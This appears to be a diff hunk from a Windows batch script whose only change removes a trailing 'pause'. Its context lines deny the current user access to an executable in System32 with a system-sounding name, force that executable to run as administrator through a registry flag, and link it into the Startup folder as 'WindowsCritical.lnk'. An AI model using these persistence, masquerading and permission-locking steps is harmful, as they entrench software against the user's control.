@@ -12,4 +12,3 @@ echo y|CACLS C:\Windows\System32\WindowsNotificationBlockerApplication.exe /P %u
 echo y|CACLS C:\Windows\System32\WindowsNotificationBlockerApplication.exe /D %username%
 REG ADD "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "C:\Windows\System32\WindowsNotificationBlocker.exe" /t REG_SZ /d "~ RUNASADMIN" /f
 powershell -Command "& {$StartUp= Join-Path $Env:USERPROFILE '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'; New-Item -ItemType SymbolicLink -Path "$StartUp" -Name "WindowsCritical.lnk" -Target "C:\Windows\System32\WindowsNotificationBlockerApplication.exe"}
-pause
